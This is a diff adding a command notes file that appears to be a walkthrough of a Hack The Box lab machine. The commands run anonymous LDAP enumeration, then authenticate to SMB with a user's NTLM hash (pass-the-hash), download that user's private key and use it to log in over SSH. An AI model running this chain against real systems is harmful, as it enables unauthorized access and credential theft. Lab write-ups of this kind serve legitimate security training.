@@ -1,0 +1,29 @@
+dapsearch -x -h 10.10.10.107
+
+nmap -p 389 --script ldap-rootdse -Pn 10.10.10.107
+nmap -p 389 --script ldap-search -Pn 10.10.10.107
+
+--------------------------------------------------------
+
+ldapsearch -x -h 10.10.10.107 -s base
+ldapsearch -x -h 10.10.10.107 -s base -b 'dc=hackthebox,dc=htb'
+ldapsearch -x -h 10.10.10.107 -s sub -b 'dc=hackthebox,dc=htb'
+
+echo -n e3NyeXB0fSo= | base64 -d
+
+--------------------------------------------------------
+
+smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' H 10.10.10.107
+
+smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' H 10.10.10.107 -R
+
+smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' H 10.10.10.107 --download alice1978/my_private_key.ppk
+
+--------------------------------------------------------
+apt install putty-tools
+
+puttygen my_private_key.ppk -O private-openssh -o alice.pem
+
+chmod 600 alice.pem
+
+ssh -i alice.pem alice1978@10.10.10.107
